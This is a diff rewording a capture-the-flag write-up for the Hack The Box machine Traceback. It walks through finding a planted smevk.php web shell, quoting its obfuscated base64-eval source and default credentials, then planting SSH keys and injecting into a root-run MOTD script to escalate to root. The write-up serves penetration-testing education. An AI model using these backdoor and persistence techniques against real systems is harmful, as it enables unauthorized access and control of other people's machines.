@@ -6,18 +6,18 @@ points: 20
 rating: 4
 date: 2020-03-14
 avatar: assets/htb/traceback.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Traceback
 ---
+
 ## Overview
 
-Traceback is an easy difficulty Linux machine that gives a good introduction to web shells and tracing the steps of how an attacker compromised a server \(then defaced it!\).  
+Traceback is an easy Linux box that serves as a solid intro to web shells, and to retracing the path a prior attacker took to break into a server \(and then deface it!\).  
 
 ## Enumeration
 
 ### Nmap scan
 
-I started off my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oN <name>` saves the output with a filename of `<name>`.
+I kicked things off by running an nmap scan against `<YOUR_IP>`. My usual flag set is: `-p-`, a shorthand telling nmap to cover every TCP port, `-sC`, which is the same as `--script=default` and fires off nmap's default enumeration scripts at the host, `-sV` for service/version detection, and `-oN <name>` to write the results to a file called `<name>`.
 
 ```text
 kac0@kali:~/htb/traceback$ nmap -p- -sC -sV -oN traceback.nmap <YOUR_IP>
@@ -42,7 +42,7 @@ Nmap done: 1 IP address (1 host up) scanned in 40.09 seconds
 
 ### SSH
 
-The only ports that were open were 22 -SSH and 80 - HTTP. I first tried connecting to SSH:
+Only two ports came back open: 22 (SSH) and 80 (HTTP). My first move was to connect to SSH:
 
 ```text
 #################################
@@ -51,29 +51,29 @@ The only ports that were open were 22 -SSH and 80 - HTTP. I first tried connecti
 #################################
 ```
 
-I wasn't able to login, but I noticed a banner saying that the system had been owned due to poor configurations by someone named `Xh4H`. 
+I couldn't authenticate, but the login banner revealed that the box had been compromised by someone going by `Xh4H`, who attributed it to weak configuration. 
 
 ### HTTP
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-21_16-48-34%2520%25281%2529.png)
 
-Connecting to port 80 through a web browser gave me a very similar message. It also said something about a backdoor, so I fired up `gobuster` to see if I could find any other pages since there were no other hints or ways to progress.  
+Browsing to port 80 presented a nearly identical message. It also mentioned a backdoor, so with no other leads to follow I launched `gobuster` to hunt for additional pages.  
 
 ```text
 gobuster dir -u http://<YOUR_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o traceback.gobuster
 ```
 
-Unfortunately this did not get me anywhere, as the connection was blocked and I wasn't able to find anything.
+This turned up nothing useful, since the connection was being blocked.
 
 ### FREE INTERNETZZZ - Twitter OSINT
 
-Next I tried a web search for `FREE INTERNETZZZ`, which led me to Twitter of all places.
+My next idea was to search the web for `FREE INTERNETZZZ`, which surprisingly pointed me to Twitter.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/free-internetzzzz.png)
+![](assets/wu/traceback/img-2.png)
 
-"Pretty interesting collection of webshells:"  says the [author](https://twitter.com/RiftWhiteHat/status/1237311680276647936) of this machine...and posted around the same time as the release \(14 Mar 2020 - See [info card](traceback-write-up.md#overview)\).  This felt a lot like an OSINT-type challenge to me.   Clicking on the post led to a collection of "Some of the best web shells that you might need" at [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells).
+"Pretty interesting collection of webshells:" reads the tweet from the box's [author](https://twitter.com/RiftWhiteHat/status/1237311680276647936), posted right around the release date \(14 Mar 2020 - See [info card](traceback-write-up.md#overview)\).  To me this had the feel of an OSINT-style challenge.   Following the post took me to a set of "Some of the best web shells that you might need" hosted at [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells).
 
-I didn't know which web shell was used, and the hint left by `Xh4H` only led to a GitHub repository with a collection of shells. I downloaded them all and started poking through the code to see if anything looked familiar, but most of it was obfuscated and I couldn't find the phrase `FREE INTERNETZZZ` in any of the files. So, I created a list of the filenames and used `wfuzz` to check to see if any of them had been uploaded to the site. _\(And I hoped that the filename hadn't been changed!\)_
+I had no idea which shell had actually been deployed, and the clue from `Xh4H` only pointed at a GitHub repo full of shells. I grabbed all of them and dug through the source looking for something recognizable, but the bulk of it was obfuscated and the string `FREE INTERNETZZZ` didn't appear in any file. So I built a list of the filenames and ran `wfuzz` against the site to see whether any of them had been dropped there. _\(While hoping the filename hadn't been renamed!\)_
 
 ```bash
 kac0@kali:~/htb/traceback/webshells$ ls -1 > webshells
@@ -104,11 +104,11 @@ Requests/sec.: 18.04628
 
 ### Smevk\_Pathan Shell v3
 
-Using `wfuzz` I was able to find the web shell used at `http://<YOUR_IP>/smevk.php`.I navigated to this page and got a login screen.
+`wfuzz` revealed the deployed web shell at `http://<YOUR_IP>/smevk.php`.Browsing to it presented a login screen.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_13-13-58.png)
+![](assets/wu/traceback/img-3.png)
 
-I opened the code of the `smevk.php` web shell that I had downloaded earlier and didn't have to search long to find what I was looking for.
+I pulled up the source of the `smevk.php` shell I'd downloaded earlier, and it took only a moment to spot what I needed.
 
 ```text
 <?php 
@@ -147,15 +147,15 @@ eval("?>".(base64_decode($smevk)));
 ?>
 ```
 
-The code came with hard-coded default credentials of `admin:admin`. I tried them out on the login page, and was granted access to the shell page.
+The shell shipped with hard-coded default credentials of `admin:admin`. Entering them on the login page let me straight into the shell interface.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_13-18-32.png)
+![](assets/wu/traceback/img-4.png)
 
-When I first started poking around, clicking on buttons and trying to use the shell to enumerate the system I was getting a bit frustrated.  Nothing seemed to be working.  Below are my original notes:
+My first attempts to explore the system, clicking buttons and trying to enumerate through the shell, were frustrating.  Nothing appeared to respond.  Here are my original notes:
 
 > It seems as if a lot of the functionality was stripped out...most of the buttons do nothing. Never mind...DOESNT WORK IN FIREFOX!!!! &gt; worked just fine in Chromium!
 
-For some reason the web shell did not function properly in Firefox.  When I finally got tired of banging my head against the shell trying to find something that worked, I decided to try opening it in Chromium instead...and everything worked!
+For whatever reason the web shell misbehaved in Firefox.  Once I'd had enough of fighting with it, I tried loading it in Chromium instead...and suddenly everything worked!
 
 ```text
 kac0@kali:~/htb/traceback$ echo 'PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsn\
@@ -198,21 +198,19 @@ function printLogin() {
 }
 ```
 
-After doing some troubleshooting and looking into the code it seemed as if the web shell itself was looking for a HTTP\_USER\_AGENT with 'Google' in it. I wasn't sure why this might interfere since it seems to give a 404 error if the user agent IS Google. This may be just to keep the Google bots from crawling the page and discovering the backdoor.  Using the unPHP decoder site [https://www.unphp.net/decode/9e310714b0ca99497d4a486d220d34f7/](https://www.unphp.net/decode/9e310714b0ca99497d4a486d220d34f7/) I read through the rest of the code of the backdoor to see if I could find anything that would cause it to not work in Firefox, but I didn't see anything obvious.
+After some debugging and a closer read of the code, it looked like the shell checks whether the HTTP\_USER\_AGENT contains 'Google'. I couldn't see why that would matter here, since it returns a 404 only when the agent IS Google. That's likely just there to stop Google's crawlers from indexing the page and exposing the backdoor.  Using the unPHP decoder at [https://www.unphp.net/decode/9e310714b0ca99497d4a486d220d34f7/](https://www.unphp.net/decode/9e310714b0ca99497d4a486d220d34f7/) I went through the rest of the backdoor's code hunting for whatever broke it in Firefox, but nothing stood out.
 
 ## Road to User
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-22_17-41-38.png)
+![](assets/wu/traceback/img-5.png)
 
-I noticed that the web shell told me that the username we had control of was `webadmin`, so I decided to try to add my public SSH key to the `.ssh/authorized_keys` file of that user to see if it would let me log in that way. I entered the command `echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /home/webadmin/.ssh/authorized_keys` into the `Console` field of the web shell.  _\(Notice the append operator `>>`?  Please be nice to your fellow players and don't overwrite the whole file with `>`!\)_
+The web shell indicated the account it ran as was `webadmin`, so I figured I'd append my public SSH key to that user's `.ssh/authorized_keys` file and see if I could log in over SSH. I ran `echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /home/webadmin/.ssh/authorized_keys` from the web shell's `Console` field.  _\(See the append operator `>>`?  Be considerate to other players and avoid clobbering the whole file with `>`!\)_
 
-{% hint style="info" %}
-According to [https://www.ssh.com/ssh/keygen/](https://www.ssh.com/ssh/keygen/) you can also do this remotely from a terminal using**`ssh-copy-id -i ~/.ssh/tatu-key-ecdsa user@host`** but you need to be able to authenticate to the machine already to do this.  
-{% endhint %}
+Per [https://www.ssh.com/ssh/keygen/](https://www.ssh.com/ssh/keygen/), you can also accomplish this from a terminal with**`ssh-copy-id -i ~/.ssh/tatu-key-ecdsa user@host`**, though that requires being able to authenticate to the host beforehand.  
 
 ### Enumeration as `webadmin`
 
-After uploading my public key it was easy to just SSH into the machine using my own private key.
+With my public key in place, logging into the box over SSH with my private key was trivial.
 
 ```text
 kac0@kali:~/htb/traceback$ ssh webadmin@<YOUR_IP>
@@ -229,7 +227,7 @@ webadmin
 traceback
 ```
 
-The first thing I do when getting a new user account is see what privileges I have and if I can execute anything with `sudo` by using the `-l` flag.
+Whenever I land a new user, my first step is to check my privileges and see what I'm allowed to run via `sudo` using the `-l` flag.
 
 ```text
 webadmin@traceback:~$ sudo -l
@@ -241,7 +239,7 @@ User webadmin may run the following commands on traceback:
     (sysadmin) NOPASSWD: /home/sysadmin/luvit
 ```
 
-I was able to execute the `luvit` program in `sysadmin`'s home folder as that user without a password.
+It turned out I could run the `luvit` binary in `sysadmin`'s home directory as that user, no password required.
 
 ### Making user creds
 
@@ -251,13 +249,13 @@ Welcome to the Luvit repl!
 >
 ```
 
-By reading a bit on `luvit`, I discovered it was essentially a `lua` programming language shell.  
+A little reading on `luvit` told me it's basically a `lua` language shell.  
 
 > Repl\#
 >
 > Implementation of a read-execute-print-loop in Luvit. Used by the Luvit repl which is returned when the Luvit binary is executed without args.
 
-From [https://www.lua.org/pil/22.2.html](https://www.lua.org/pil/22.2.html) I discovered I could execute system commands by using the syntax `os.execute("mkdir " .. dirname)`. 
+From [https://www.lua.org/pil/22.2.html](https://www.lua.org/pil/22.2.html) I learned I could run system commands with the syntax `os.execute("mkdir " .. dirname)`. 
 
 ```lua
 > os.execute("ls")
@@ -268,7 +266,7 @@ sh: 1: catnote.txt: not found
 nil     'exit'  127
 ```
 
-_A quick troubleshooting note... you will need to make sure to put a space between the command and the argument manually, as this seems to just concatenate the two strings then executes. The space can either be at the end of the command or the beginning of the arguments._
+_One quick gotcha... you have to insert a space between the command and its argument yourself, because this simply joins the two strings and runs the result. The space can sit at the end of the command or the start of the argument._
 
 ### User.txt
 
@@ -289,13 +287,13 @@ true    'exit'  0
 
 ### Getting a shell as `sysadmin`
 
-While reading up on how to execute commands in this `luvit` shell, I came across this page [https://simion.com/info/calling\_external\_programs.html](https://simion.com/info/calling_external_programs.html) which described a way to execute commands that were more complex than a simple "command" .. "argument" format.
+While researching command execution in the `luvit` shell, I found [https://simion.com/info/calling\_external\_programs.html](https://simion.com/info/calling_external_programs.html), which showed a way to run commands more involved than the basic "command" .. "argument" form.
 
 ```text
 > os.execute 'echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /home/sysadmin/.ssh/authorized_keys'
 ```
 
-I used this to once again copy my public SSH key to the new user, and used SSH to login.
+I leveraged this to once more drop my public SSH key for the new user, then logged in via SSH.
 
 ```text
 kac0@kali:~/htb/traceback$ ssh sysadmin@<YOUR_IP>
@@ -317,9 +315,9 @@ sysadmin
 
 ### Enumeration as `sysadmin`
 
-I started out in `/bin/sh`, which was pretty limiting \(no history, arrow keys, or tab completion, etc\) so I tried to use my standard python PTY shell upgrade trick, but it didn't work.  _It was late and I was tired, so I looked up how to do it in Perl, since it was installed, using `perl -e 'exec "/bin/bash";'`.   When I went back to it the next morning, I realized that indeed python was not installed...but python3 was!  Doh!_
+I landed in `/bin/sh`, which was fairly restrictive \(no history, arrow keys, tab completion, etc\), so I reached for my usual python PTY upgrade trick, but it failed.  _It was late and I was tired, so I looked up the Perl equivalent, which was installed, and used `perl -e 'exec "/bin/bash";'`.   Coming back to it the next morning, I realized python really wasn't installed...but python3 was!  Doh!_
 
-I wasn't able to check sudo permissions without a password, so I checked running processes next.  I noticed a strange `sleep 30` process running by root, so I decided to look further into what processes were being run as root with `ps -U root -u root` _\(from the man page\)_.
+Since I couldn't inspect sudo rights without a password, I turned to the running processes instead.  An odd `sleep 30` process owned by root caught my eye, so I dug into the root-owned processes with `ps -U root -u root` _\(from the man page\)_.
 
 ```text
 sysadmin@traceback:/$ ps -U root -u root
@@ -344,7 +342,7 @@ root      10212  0.0  0.0   4628   812 ?        Ss   16:52   0:00 /bin/sh -c sle
 root      10213  0.0  0.0   7468   840 ?        S    16:52   0:00 sleep 30
 ```
 
-There was a script running every 30 seconds which restored a backup of the MOTD \(message of the day\) which definitely looked odd, so I checked both of the directories in the command to see if could find anything useful.
+A script was firing every 30 seconds to restore a backup of the MOTD \(message of the day\), which clearly stood out, so I inspected both directories referenced in the command for anything I could use.
 
 ```text
 sysadmin@traceback:/var/backups/.update-motd.d$ cd /etc/update-motd.d/
@@ -359,7 +357,7 @@ drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
 -rwxrwxr-x  1 root sysadmin  299 Jun 22 17:07 91-release-upgrade
 ```
 
-Interestingly, the files in `/etc/update-motd.d/` were editable by `sysadmin`. _\(The backups were not\)._
+Notably, `sysadmin` had write access to the files in `/etc/update-motd.d/`. _\(The backups, however, were not writable\)._
 
 ```text
 sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
@@ -389,19 +387,19 @@ sysadmin@traceback:/etc/update-motd.d$ cat 00-header
 echo "\nWelcome to Xh4H land \n"
 ```
 
-The file `00-header`seem to have been edited already by `Xh4H` when he defaced the site and set up his web shell. MOTD banners are just bash scripts which are executed each time a user logs into the machine, so I decided to add a line of my own to see if I could escalate privileges since the files and process that ran them were owned by `root`.  
+The `00-header` file appeared to have already been modified by `Xh4H` when he defaced the site and planted his web shell. Since MOTD banners are simply bash scripts executed on each user login, and both the files and the process running them were owned by `root`, I figured I'd append a line of my own and attempt a privilege escalation.  
 
 ### Getting a root shell
 
-According to the `ps` output, every 30 secs a cronjob copies the backups from `/var/backups/.update-motd.d/` to `/etc/update-motd.d/`. This was the window I had to edit the file and get it to execute to initiate my exploit before the backup wiped my progress. I decided to go for broke and simply use the same privilege escalation method I had already been using. 
+Based on the `ps` output, a cronjob copies the backups from `/var/backups/.update-motd.d/` over to `/etc/update-motd.d/` every 30 seconds. That gave me a narrow window to edit the file and trigger it before the backup overwrote my changes. I went for it and reused the very same privilege escalation technique I'd applied for the previous users. 
 
 ```text
 sysadmin@traceback:/etc/update-motd.d$ echo 'echo "ssh-rsa AAAA<my_public_key> kac0@kali" >> /root/.ssh/authorized_keys' >> 00-header
 ```
 
-I copied the same `echo` command I had used to escalate privileges to the previous two users, and echoed it into the MOTD file `00-header`. I set it to copy my public SSH key to the `authorized_keys` file, this time in the `/root/.ssh/` folder. 
+I took the same `echo` command I'd used to escalate to the prior two users and wrote it into the `00-header` MOTD file. This time it was set to append my public SSH key to the `authorized_keys` file in the `/root/.ssh/` directory. 
 
-In order to execute my command, I needed to run the MOTD program. Since this program is automatically run upon login, I simply logged out, connected back to the `sysadmin` user through SSH, then logged out again, then logged in as `root`.
+To trigger my command, the MOTD program had to run. Because it runs automatically at login, I just logged out, reconnected to `sysadmin` over SSH, logged out once more, and then logged in as `root`.
 
 ```text
 kac0@kali:~/htb/traceback$ ssh root@<YOUR_IP>
@@ -422,7 +420,7 @@ traceback
 
 ### Root.txt
 
-Of course I couldn't forget to collect my hard-earned proof!
+And of course, I made sure to grab my well-earned proof!
 
 ```text
 root@traceback:~# cat root.txt 
